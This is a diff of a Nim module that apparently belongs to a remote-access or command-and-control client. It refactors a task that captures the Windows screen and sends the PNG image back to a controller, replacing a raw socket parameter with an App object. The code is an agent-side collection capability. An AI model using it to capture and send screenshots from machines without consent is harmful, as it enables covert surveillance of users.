@@ -1,9 +1,8 @@
-from std/net import Socket
 import winim, pixie, json
-import ../client/communication
+import ../client/[communication, types]
 
 # code from https://gist.githubusercontent.com/treeform/782149b5fc938753feacfca43637aa90/raw/4e05ca592a02cc2740a67a7e2e3f783876dec879/screenshot.nim 's replies
-proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let taskOutput = TaskOutput(
     task: "output",
     taskId: taskId,
@@ -59,4 +58,4 @@ proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
   DeleteObject hBitmap
 
   taskOutput.addData(DataType.Image, "screenshot", image.encodeImage(PngFormat))
-  socket.sendOutput(taskOutput)
+  app.sendOutput(taskOutput)
